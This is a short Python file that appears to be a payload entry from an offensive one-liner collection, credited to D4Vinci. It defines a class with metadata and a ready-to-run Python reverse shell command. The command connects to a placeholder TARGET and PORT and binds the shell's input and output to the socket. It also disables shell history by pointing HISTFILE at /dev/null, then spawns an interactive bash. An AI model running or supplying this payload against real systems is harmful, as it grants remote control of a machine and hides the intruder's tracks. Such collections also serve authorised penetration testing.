class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Use python socket to connect back & launch interactive shell with pty."
    function    = "reverse shell"
    liner     = """python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('TARGET',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');s.close();" """
